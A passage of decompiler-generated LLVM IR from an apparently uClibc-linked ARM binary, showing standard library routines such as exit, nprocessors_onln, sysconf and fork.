  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_fc5c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fc5c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_fc20, { 1, 0 }
  uselistorder label %dec_label_pc_fbfc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fba0, { 1, 0 }
  uselistorder label %dec_label_pc_fb9c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb14, { 1, 0 }
  uselistorder label %dec_label_pc_fb10, { 1, 0 }
  uselistorder label %dec_label_pc_fad8, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  %v4_fc90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 148) to i32*), align 4
  store i32 %v4_fc90, i32* @r4, align 4
  %v2_fc98 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_fcb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_fcb0)
  %v0_fcc4 = load i32, i32* @r5, align 4
  %v2_fcc4 = add i32 %v0_fcc4, 16
  %v3_fcc4 = inttoptr i32 %v2_fcc4 to i32*
  %v4_fcc4 = load i32, i32* %v3_fcc4, align 4
  call void @__pseudo_branch(i32 %v4_fcc4)
  %v0_fcd4 = load i32, i32* @r5, align 4
  %v2_fcd4 = add i32 %v0_fcd4, 11584
  %v3_fcd4 = inttoptr i32 %v2_fcd4 to i32*
  %v4_fcd4 = load i32, i32* %v3_fcd4, align 4
  %v2_fcdc = icmp eq i32 %v4_fcd4, 0
  br i1 %v2_fcdc, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_fce8 = xor i1 %v2_fcdc, true
  call void @__pseudo_cond_branch(i1 %v2_fce8, i32 %v4_fcd4)
  store i32 %v2_fc98, i32* @r0, align 4
  %v0_fcf8 = load i32, i32* @r5, align 4
  %v2_fcf8 = add i32 %v0_fcf8, 48
  %v3_fcf8 = inttoptr i32 %v2_fcf8 to i32*
  %v4_fcf8 = load i32, i32* %v3_fcf8, align 4
  call void @__pseudo_branch(i32 %v4_fcf8)
  %v0_fd04 = call i32 @__GI___uClibc_fini()
  %v0_fd0c = load i32, i32* @r5, align 4
  %v2_fd0c = add i32 %v0_fd0c, -100212
  %v2_fd14 = icmp eq i32 %v2_fd0c, 0
  br i1 %v2_fd14, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_fd1c = xor i1 %v2_fd14, true
  call void @__pseudo_cond_branch(i1 %v2_fd1c, i32 %v2_fd0c)
  %v0_fd20 = load i32, i32* @r6, align 4
  %v1_fd24 = call i32 @__GI__exit(i32 %v0_fd20)
  %v0_fd28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fd28, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_fd28 = load i32, i32* @r1, align 4
  %v3_fd28 = load i32, i32* @r3, align 4
  %v4_fd28 = lshr i32 %v4_fcf8, %v3_fd28
  %v5_fd28 = sub i32 32, %v3_fd28
  %v6_fd28 = shl i32 %v4_fcf8, %v5_fd28
  %v7_fd28 = or i32 %v6_fd28, %v4_fd28
  %v9_fd28 = and i32 %v7_fd28, %v1_fd28
  store i32 %v9_fd28, i32* @r4, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_fd40 = phi i32 [ %v1_fd24, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_fd40

; uselistorder directives
  uselistorder i32 %v4_fcf8, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35816), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_fd68 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35816))
  store i32 %v1_fd68, i32* @r6, align 4
  %v2_fd6c = icmp eq i32 %v1_fd68, 0
  br i1 %v2_fd6c, label %dec_label_pc_fdec, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %entry
  store i32 1784, i32* @sl, align 4
  %v0_fd7c = load i32, i32* @r4, align 4
  %v2_fd7c = add i32 %v0_fd7c, -35804
  store i32 %v2_fd7c, i32* @r8, align 4
  %v2_fd80 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fd80, i32* @r7, align 4
  br label %bb18

dec_label_pc_fd88:                                ; preds = %bb18
  %v3_fd88 = load i32, i32* %stack_var_-36, align 4
  %v1_fd8c = inttoptr i32 %v3_fd88 to i32*
  %v2_fd8c = load i32, i32* %v1_fd8c, align 4
  %v1_fd90 = inttoptr i32 %v2_fd8c to i8*
  %v2_fd90 = load i8, i8* %v1_fd90, align 1
  %v7_fd94 = icmp eq i8 %v2_fd90, 99
  br i1 %v7_fd94, label %dec_label_pc_fd9c, label %.backedge3

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd88
  %v1_fd9c = add i32 %v2_fd8c, 1
  %v2_fd9c = inttoptr i32 %v1_fd9c to i8*
  %v3_fd9c = load i8, i8* %v2_fd9c, align 1
  %v7_fda0 = icmp eq i8 %v3_fd9c, 112
  br i1 %v7_fda0, label %dec_label_pc_fda8, label %.backedge3

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fd9c
  %v1_fda8 = add i32 %v2_fd8c, 2
  %v2_fda8 = inttoptr i32 %v1_fda8 to i8*
  %v3_fda8 = load i8, i8* %v2_fda8, align 1
  %v7_fdac = icmp eq i8 %v3_fda8, 117
  br i1 %v7_fdac, label %dec_label_pc_fdb4, label %.backedge3

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fda8
  %v1_fdb4 = add i32 %v2_fd8c, 3
  %v2_fdb4 = inttoptr i32 %v1_fdb4 to i8*
  %v3_fdb4 = load i8, i8* %v2_fdb4, align 1
  %v4_fdb4 = zext i8 %v3_fdb4 to i32
  %v0_fdb8 = load i32, i32* @r4, align 4
  %v1_fdb8 = load i32, i32* @sl, align 4
  %v2_fdb8 = add i32 %v1_fdb8, %v0_fdb8
  %v3_fdb8 = inttoptr i32 %v2_fdb8 to i32*
  %v4_fdb8 = load i32, i32* %v3_fdb8, align 4
  %v2_fdbc = mul nuw nsw i32 %v4_fdb4, 2
  %v2_fdc0 = add i32 %v4_fdb8, %v2_fdbc
  %v3_fdc0 = inttoptr i32 %v2_fdc0 to i16*
  %v4_fdc0 = load i16, i16* %v3_fdc0, align 2
  %v1_fdc4 = and i16 %v4_fdc0, 8
  %v2_fdc4 = icmp eq i16 %v1_fdc4, 0
  br i1 %v2_fdc4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_fdb4
  %v1_fdc8 = load i32, i32* @r5, align 4
  %v2_fdc8 = add i32 %v1_fdc8, 1
  store i32 %v2_fdc8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_fdb4, %dec_label_pc_fd88, %dec_label_pc_fd9c, %dec_label_pc_fda8
  %v0_fdcc.pre = load i32, i32* @r6, align 4
  %v0_fdd8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_fd74
  %v0_fdd8 = phi i32 [ %v0_fdd8.pre, %.backedge3 ], [ %v2_fd7c, %dec_label_pc_fd74 ]
  %v0_fdcc = phi i32 [ %v0_fdcc.pre, %.backedge3 ], [ %v1_fd68, %dec_label_pc_fd74 ]
  %v4_fddc = inttoptr i32 %v0_fdcc to i32*
  %v5_fddc = call i32 @__GI_config_read(i32* %v4_fddc, i32 %v2_fd80, i32 258, i32 %v0_fdd8)
  %v2_fde0 = icmp eq i32 %v5_fddc, 0
  br i1 %v2_fde0, label %dec_label_pc_fe50, label %dec_label_pc_fd88

dec_label_pc_fdec:                                ; preds = %entry
  %v0_fdf0 = load i32, i32* @r4, align 4
  %v2_fdf0 = add i32 %v0_fdf0, -35800
  store i32 %v2_fdf0, i32* @r0, align 4
  %v1_fdf4 = call i32 @__GI_config_open(i32 %v2_fdf0)
  store i32 %v1_fdf4, i32* @r6, align 4
  %v2_fdf8 = icmp eq i32 %v1_fdf4, 0
  br i1 %v2_fdf8, label %bb19, label %dec_label_pc_fe04

bb19:                                             ; preds = %dec_label_pc_fdec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_fe50

dec_label_pc_fe04:                                ; preds = %dec_label_pc_fdec
  %v0_fe08 = load i32, i32* @r4, align 4
  %v2_fe08 = add i32 %v0_fe08, -35784
  store i32 %v2_fe08, i32* @r8, align 4
  %v2_fe10 = add i32 %v0_fe08, -35748
  store i32 %v2_fe10, i32* @r7, align 4
  %v2_fe14 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fe14, i32* @r4, align 4
  br label %bb21

dec_label_pc_fe1c:                                ; preds = %bb21
  %v0_fe48 = load i32, i32* @r8, align 4
  %v3_fe1c = load i32, i32* %stack_var_-36, align 4
  %v1_fe20 = inttoptr i32 %v3_fe1c to i32*
  %v2_fe20 = load i32, i32* %v1_fe20, align 4
  store i32 %v2_fe20, i32* @r1, align 4
  %v2_fe24 = inttoptr i32 %v0_fe48 to i8*
  %v3_fe24 = call i32 @__GI_strcoll(i8* %v2_fe24, i32 %v2_fe20)
  %v2_fe28 = icmp eq i32 %v3_fe24, 0
  br i1 %v2_fe28, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_fe1c
  %v1_fe2c = load i32, i32* @r5, align 4
  %v2_fe2c = add i32 %v1_fe2c, 1
  store i32 %v2_fe2c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_fe1c
  %v0_fe38.pre = load i32, i32* @r7, align 4
  %v0_fe3c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_fe04
  %v0_fe3c = phi i32 [ %v0_fe3c.pre, %.backedge ], [ %v1_fdf4, %dec_label_pc_fe04 ]
  %v0_fe38 = phi i32 [ %v0_fe38.pre, %.backedge ], [ %v2_fe10, %dec_label_pc_fe04 ]
  %v4_fe40 = inttoptr i32 %v0_fe3c to i32*
  %v5_fe40 = call i32 @__GI_config_read(i32* %v4_fe40, i32 %v2_fe14, i32 459266, i32 %v0_fe38)
  %v2_fe44 = icmp eq i32 %v5_fe40, 0
  br i1 %v2_fe44, label %dec_label_pc_fe50, label %dec_label_pc_fe1c

dec_label_pc_fe50:                                ; preds = %bb18, %bb21, %bb19
  %v0_fe50 = load i32, i32* @r6, align 4
  %v1_fe54 = inttoptr i32 %v0_fe50 to i32*
  %v2_fe54 = call i32 @__GI_config_close(i32* %v1_fe54)
  %v0_fe58 = load i32, i32* @r5, align 4
  %v2_fe58 = icmp eq i32 %v0_fe58, 0
  %.v0_fe58 = select i1 %v2_fe58, i32 1, i32 %v0_fe58
  ret i32 %.v0_fe58

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_fe50, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_10284

bb:                                               ; preds = %entry
  %v7_fea8 = mul i32 %arg1, 4
  %v8_fea8 = add i32 %v7_fea8, ptrtoint (i32* @global_var_feb0.646 to i32)
  call void @__pseudo_branch(i32 %v8_fea8)
  br label %dec_label_pc_10284

dec_label_pc_10284:                               ; preds = %bb, %entry
  %v0_10288 = call i32 @__aeabi_read_tp()
  %v3_1028c = load i16, i16* @global_var_24070.401, align 2
  %v4_1028c = sext i16 %v3_1028c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_10298 = add i32 %v4_1028c, %v0_10288
  %v4_10298 = inttoptr i32 %v3_10298 to i32*
  store i32 22, i32* %v4_10298, align 4
  %v0_1047c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1047c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 15396, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r8.global-to-local, align 4
  %v4_105a816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15396) to i32*), align 4
  store i32 %v4_105a816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_105ac18 = icmp eq i32 %v4_105a816, 0
  br i1 %v2_105ac18, label %dec_label_pc_105b4, label %dec_label_pc_104d8

dec_label_pc_104d8:                               ; preds = %entry, %dec_label_pc_105a8.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_104e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_104e4 = add i32 %v0_104e4, 20
  %v2_104e4 = inttoptr i32 %v1_104e4 to i32*
  %v3_104e4 = load i32, i32* %v2_104e4, align 4
  store i32 %v3_104e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_104e8 = icmp eq i32 %v3_104e4, 0
  store i32 %v3_104e4, i32* %r4.global-to-local, align 4
  %v1_104f0 = add i32 %v3_104e4, 1
  store i32 %v1_104f0, i32* %r1.global-to-local, align 4
  br i1 %v2_104e8, label %dec_label_pc_105a8.backedge, label %dec_label_pc_104f8

dec_label_pc_105a8.backedge:                      ; preds = %dec_label_pc_104d8, %dec_label_pc_10524
  %v0_105a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_105a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_105a8 = add i32 %v1_105a8, %v0_105a8
  %v3_105a8 = inttoptr i32 %v2_105a8 to i32*
  %v4_105a8 = load i32, i32* %v3_105a8, align 4
  store i32 %v4_105a8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_105ac = icmp eq i32 %v4_105a8, 0
  br i1 %v2_105ac, label %dec_label_pc_105b4, label %dec_label_pc_104d8

dec_label_pc_104f8:                               ; preds = %dec_label_pc_104d8
  %v0_104f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_104f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_104f8 = add i32 %v1_104f8, %v0_104f8
  %v3_104f8 = inttoptr i32 %v2_104f8 to i32*
  %v4_104f8 = load i32, i32* %v3_104f8, align 4
  %v1_104fc = add i32 %v4_104f8, 20
  store i32 %v1_104fc, i32* %r2.global-to-local, align 4
  %v1_10500132 = inttoptr i32 %v1_104fc to i32*
  %v2_10500133 = load i32, i32* %v1_10500132, align 4
  store i32 %v2_10500133, i32* %r3.global-to-local, align 4
  %v3_10504135 = icmp uge i32 %v2_10500133, %v3_104e4
  store i1 %v3_10504135, i1* %cpsr_c.global-to-local, align 1
  %v9_10504141 = icmp eq i32 %v2_10500133, %v3_104e4
  br i1 %v9_10504141, label %dec_label_pc_1050c, label %dec_label_pc_10524

dec_label_pc_1050c:                               ; preds = %dec_label_pc_104f8, %dec_label_pc_1050c.dec_label_pc_10500_crit_edge
  %v0_1050c142 = phi i32 [ %v1_10504.pre, %dec_label_pc_1050c.dec_label_pc_10500_crit_edge ], [ %v3_104e4, %dec_label_pc_104f8 ]
  store i32 %v0_1050c142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1051c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1051c, label %dec_label_pc_10520, label %dec_label_pc_1050c.dec_label_pc_10500_crit_edge

dec_label_pc_1050c.dec_label_pc_10500_crit_edge:  ; preds = %dec_label_pc_1050c
  %v0_10500.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10504.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10500 = inttoptr i32 %v0_10500.pre to i32*
  %v2_10500 = load i32, i32* %v1_10500, align 4
  store i32 %v2_10500, i32* %r3.global-to-local, align 4
  %v3_10504 = icmp uge i32 %v2_10500, %v1_10504.pre
  store i1 %v3_10504, i1* %cpsr_c.global-to-local, align 1
  %v9_10504 = icmp eq i32 %v2_10500, %v1_10504.pre
  br i1 %v9_10504, label %dec_label_pc_1050c, label %dec_label_pc_10524

dec_label_pc_10520:                               ; preds = %dec_label_pc_1050c
  %v0_10520 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10520, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10524

dec_label_pc_10524:                               ; preds = %dec_label_pc_104f8, %dec_label_pc_1050c.dec_label_pc_10500_crit_edge, %dec_label_pc_10520
  %v0_10524 = phi i32 [ %v0_10520, %dec_label_pc_10520 ], [ %v2_10500133, %dec_label_pc_104f8 ], [ %v2_10500, %dec_label_pc_1050c.dec_label_pc_10500_crit_edge ]
  %v1_10524 = phi i32 [ %v0_10520, %dec_label_pc_10520 ], [ %v3_104e4, %dec_label_pc_104f8 ], [ %v1_10504.pre, %dec_label_pc_1050c.dec_label_pc_10500_crit_edge ]
  %v3_10524 = icmp uge i32 %v0_10524, %v1_10524
  store i1 %v3_10524, i1* %cpsr_c.global-to-local, align 1
  %v9_10524 = icmp eq i32 %v0_10524, %v1_10524
  br i1 %v9_10524, label %dec_label_pc_1052c, label %dec_label_pc_105a8.backedge

dec_label_pc_1052c:                               ; preds = %dec_label_pc_10524
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10540 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_10530

dec_label_pc_10530:                               ; preds = %dec_label_pc_10598, %dec_label_pc_1052c
  %v0_10530 = load i32, i32* %r7.global-to-local, align 4
  %v1_10530 = add i32 %v0_10530, 4
  %v2_10530 = inttoptr i32 %v1_10530 to i32*
  %v3_10530 = load i32, i32* %v2_10530, align 4
  store i32 %v3_10530, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10534 = icmp eq i32 %v3_10530, 0
  br i1 %v2_10534, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_10530
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_10530, %bb
  %v2_1053c = xor i1 %v2_10534, true
  call void @__pseudo_cond_branch(i1 %v2_1053c, i32 %v3_10530)
  %v0_10544 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10544, i32* %stack_var_-88, align 4
  %v1_10548 = inttoptr i32 %v0_10544 to i32*
  %v2_10548 = load i32, i32* %v1_10548, align 4
  store i32 %v2_10548, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1054c = icmp eq i32 %v2_10548, 0
  store i32 %v2_10540, i32* %r5.global-to-local, align 4
  br i1 %v2_1054c, label %dec_label_pc_105b8.loopexit, label %dec_label_pc_10560

dec_label_pc_10560:                               ; preds = %bb72
  %v1_10560 = add i32 %v2_10548, 20
  store i32 %v1_10560, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_10598.dec_label_pc_10564_crit_edge, %dec_label_pc_10560
  %v0_10568 = phi i32 [ %v0_10568.pre, %dec_label_pc_10598.dec_label_pc_10564_crit_edge ], [ %v1_10560, %dec_label_pc_10560 ]
  %v0_10564 = phi i32 [ %v0_10564.pre, %dec_label_pc_10598.dec_label_pc_10564_crit_edge ], [ %v2_10548, %dec_label_pc_10560 ]
  %v1_10564 = add i32 %v0_10564, 20
  %v2_10564 = inttoptr i32 %v1_10564 to i32*
  %v3_10564 = load i32, i32* %v2_10564, align 4
  store i32 %v0_10568, i32* %r2.global-to-local, align 4
  store i32 %v3_10564, i32* %r4.global-to-local, align 4
  %v1_10570 = add i32 %v3_10564, 1
  store i32 %v1_10570, i32* %r1.global-to-local, align 4
  %v1_10574119 = inttoptr i32 %v0_10568 to i32*
  %v2_10574120 = load i32, i32* %v1_10574119, align 4
  store i32 %v2_10574120, i32* %r3.global-to-local, align 4
  %v3_10578122 = icmp uge i32 %v2_10574120, %v3_10564
  store i1 %v3_10578122, i1* %cpsr_c.global-to-local, align 1
  %v9_10578128 = icmp eq i32 %v2_10574120, %v3_10564
  br i1 %v9_10578128, label %dec_label_pc_10580, label %dec_label_pc_10598

dec_label_pc_10580:                               ; preds = %dec_label_pc_10564, %dec_label_pc_10580.dec_label_pc_10574_crit_edge
  %v0_10580129 = phi i32 [ %v1_10578.pre, %dec_label_pc_10580.dec_label_pc_10574_crit_edge ], [ %v3_10564, %dec_label_pc_10564 ]
  store i32 %v0_10580129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10590 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10590, label %dec_label_pc_10594, label %dec_label_pc_10580.dec_label_pc_10574_crit_edge

dec_label_pc_10580.dec_label_pc_10574_crit_edge:  ; preds = %dec_label_pc_10580
  %v0_10574.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10578.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10574 = inttoptr i32 %v0_10574.pre to i32*
  %v2_10574 = load i32, i32* %v1_10574, align 4
  store i32 %v2_10574, i32* %r3.global-to-local, align 4
  %v3_10578 = icmp uge i32 %v2_10574, %v1_10578.pre
  store i1 %v3_10578, i1* %cpsr_c.global-to-local, align 1
  %v9_10578 = icmp eq i32 %v2_10574, %v1_10578.pre
  br i1 %v9_10578, label %dec_label_pc_10580, label %dec_label_pc_10598

dec_label_pc_10594:                               ; preds = %dec_label_pc_10580
  %v0_10594 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10594, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10598

dec_label_pc_10598:                               ; preds = %dec_label_pc_10564, %dec_label_pc_10580.dec_label_pc_10574_crit_edge, %dec_label_pc_10594
  %v0_10598 = phi i32 [ %v0_10594, %dec_label_pc_10594 ], [ %v2_10574120, %dec_label_pc_10564 ], [ %v2_10574, %dec_label_pc_10580.dec_label_pc_10574_crit_edge ]
  %v1_10598 = phi i32 [ %v0_10594, %dec_label_pc_10594 ], [ %v3_10564, %dec_label_pc_10564 ], [ %v1_10578.pre, %dec_label_pc_10580.dec_label_pc_10574_crit_edge ]
  %v3_10598 = icmp uge i32 %v0_10598, %v1_10598
  store i1 %v3_10598, i1* %cpsr_c.global-to-local, align 1
  %v9_10598 = icmp eq i32 %v0_10598, %v1_10598
  store i32 %v2_10540, i32* %r4.global-to-local, align 4
  br i1 %v9_10598, label %dec_label_pc_10530, label %dec_label_pc_10598.dec_label_pc_10564_crit_edge

dec_label_pc_10598.dec_label_pc_10564_crit_edge:  ; preds = %dec_label_pc_10598
  %v0_10564.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10568.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10564

dec_label_pc_105b4:                               ; preds = %dec_label_pc_105a8.backedge, %entry
  %v0_105bc31 = phi i32 [ ptrtoint (i32* @global_var_24010.405 to i32), %entry ], [ %v0_105a8, %dec_label_pc_105a8.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_105b8

dec_label_pc_105b8.loopexit:                      ; preds = %bb72
  store i32 %v2_10540, i32* %r6.global-to-local, align 4
  %v0_105bc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_105b8

dec_label_pc_105b8:                               ; preds = %dec_label_pc_105b8.loopexit, %dec_label_pc_105b4
  %v0_105bc = phi i32 [ %v0_105bc.pre, %dec_label_pc_105b8.loopexit ], [ %v0_105bc31, %dec_label_pc_105b4 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_105bc = add i32 %v0_105bc, 160
  %v3_105bc = inttoptr i32 %v2_105bc to i32*
  %v4_105bc = load i32, i32* %v3_105bc, align 4
  store i32 %v4_105bc, i32* %r7.global-to-local, align 4
  %v0_105c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_105c0, i32* %r0.global-to-local, align 4
  %v1_105c4 = add i32 %v4_105bc, 8
  %v2_105c4 = inttoptr i32 %v1_105c4 to i32*
  %v3_105c4 = load i32, i32* %v2_105c4, align 4
  store i32 %v3_105c4, i32* %r3.global-to-local, align 4
  %v1_105c8 = add i32 %v0_105c0, -1168
  store i32 %v1_105c8, i32* %r5.global-to-local, align 4
  %v3_105cc = icmp uge i32 %v3_105c4, %v1_105c8
  store i1 %v3_105cc, i1* %cpsr_c.global-to-local, align 1
  %v9_105cc = icmp eq i32 %v3_105c4, %v1_105c8
  br i1 %v9_105cc, label %dec_label_pc_10734, label %dec_label_pc_105d4

dec_label_pc_105d4:                               ; preds = %dec_label_pc_105b8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_105bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_105e0112 = inttoptr i32 %v4_105bc to i32*
  %v2_105e0113 = load i32, i32* %v1_105e0112, align 4
  store i32 %v2_105e0113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_105e4115 = icmp eq i32 %v2_105e0113, 0
  br i1 %v9_105e4115, label %dec_label_pc_105ec, label %dec_label_pc_10604

dec_label_pc_105ec:                               ; preds = %dec_label_pc_105d4, %dec_label_pc_105ec.dec_label_pc_105e0_crit_edge
  %v0_105ec116 = phi i32 [ %v1_105e4.pre, %dec_label_pc_105ec.dec_label_pc_105e0_crit_edge ], [ 0, %dec_label_pc_105d4 ]
  store i32 %v0_105ec116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_105fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_105fc, label %dec_label_pc_10600, label %dec_label_pc_105ec.dec_label_pc_105e0_crit_edge

dec_label_pc_105ec.dec_label_pc_105e0_crit_edge:  ; preds = %dec_label_pc_105ec
  %v0_105e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_105e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_105e0 = inttoptr i32 %v0_105e0.pre to i32*
  %v2_105e0 = load i32, i32* %v1_105e0, align 4
  store i32 %v2_105e0, i32* %r3.global-to-local, align 4
  %v3_105e4 = icmp uge i32 %v2_105e0, %v1_105e4.pre
  store i1 %v3_105e4, i1* %cpsr_c.global-to-local, align 1
  %v9_105e4 = icmp eq i32 %v2_105e0, %v1_105e4.pre
  br i1 %v9_105e4, label %dec_label_pc_105ec, label %dec_label_pc_10604

dec_label_pc_10600:                               ; preds = %dec_label_pc_105ec
  %v0_10600 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10600, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10604

dec_label_pc_10604:                               ; preds = %dec_label_pc_105d4, %dec_label_pc_105ec.dec_label_pc_105e0_crit_edge, %dec_label_pc_10600
  %v0_10604 = phi i32 [ %v0_10600, %dec_label_pc_10600 ], [ %v2_105e0113, %dec_label_pc_105d4 ], [ %v2_105e0, %dec_label_pc_105ec.dec_label_pc_105e0_crit_edge ]
  %v1_10604 = phi i32 [ %v0_10600, %dec_label_pc_10600 ], [ 0, %dec_label_pc_105d4 ], [ %v1_105e4.pre, %dec_label_pc_105ec.dec_label_pc_105e0_crit_edge ]
  %v3_10604 = icmp uge i32 %v0_10604, %v1_10604
  store i1 %v3_10604, i1* %cpsr_c.global-to-local, align 1
  %v9_10604 = icmp eq i32 %v0_10604, %v1_10604
  br i1 %v9_10604, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_10604
  %v1_10608 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_10608, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_10604, %bb73
  %v1_1060c = xor i1 %v9_10604, true
  call void @__pseudo_cond_branch(i1 %v1_1060c, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_10610 = load i32, i32* %r5.global-to-local, align 4
